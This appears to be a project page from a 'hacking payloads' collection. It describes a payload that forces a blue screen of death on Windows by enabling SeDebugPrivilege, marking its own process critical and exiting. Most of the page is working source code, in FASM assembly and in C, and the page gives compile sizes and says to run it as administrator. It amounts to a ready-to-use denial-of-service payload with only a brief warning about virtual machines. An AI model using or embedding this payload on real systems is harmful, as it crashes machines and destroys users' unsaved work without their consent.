# BSOD

This article describes how to produce a blue screen of death on any Windows
operating system with just 3 lines of assembler. **Warning:** Consider testing
in a virtual environment rather than a productive system.

## How it works

The whole procedure is made of 3 steps:

1. Get SeDebugPrivilege. *(this requires elevated privileges)**
2. Set the current process to critical
3. ExitProcess to terminate

And because setting the process to critical after obtaining SeDebugPrivilege,
terminating it will cause a blue screen. The executable size of the FASM version
is 1024 bytes. And don't forget to either click "Run as administrator" or add
use the version with the embedded UAC manifest, which is 1.5 KB.

[![](http://bytecode77.com/images/sites/hacking/payloads/bsod/run.png)](http://bytecode77.com/images/sites/hacking/payloads/bsod/run.png)

## Source code in FASM:

This is the **FASM** version. The executable is **1 KB** when compiled.

```asm
format PE GUI 4.0
include 'win32a.inc'

lea     eax, [esp+20]
invoke  RtlAdjustPrivilege, 20, 1, 0, eax
invoke  RtlSetProcessIsCritical, 1, 0, 0
invoke  ExitProcess, 0

data import
    library \
        kernel32, 'kernel32', \
        ntdll, 'ntdll'
    import kernel32, \
        ExitProcess, 'ExitProcess'
    import ntdll, \
        RtlAdjustPrivilege, 'RtlAdjustPrivilege', \
        RtlSetProcessIsCritical, 'RtlSetProcessIsCritical'
end data
```

## Equivalent in C

This is a working code example in C. The executable is **1.5 KB** when compiled
with TCC.

```cpp
int main()
{
    int e = 0;
    RtlAdjustPrivilege(20, 1, 0, &e);
    RtlSetProcessIsCritical(1, 0, 0);
    ExitProcess();
}
```

## Screenshot

Oh, look! Windows 10 has an "improved" blue screen, even with a QR code. How considerate! Well, I miss the old color and the nostalgia I associated with it.

[![](http://bytecode77.com/images/sites/hacking/payloads/bsod/bsod.png)](http://bytecode77.com/images/sites/hacking/payloads/bsod/bsod.png)

## Project Page

[![](https://bytecode77.com/images/shared/favicon16.png) bytecode77.com/hacking/payloads/bsod](https://bytecode77.com/hacking/payloads/bsod)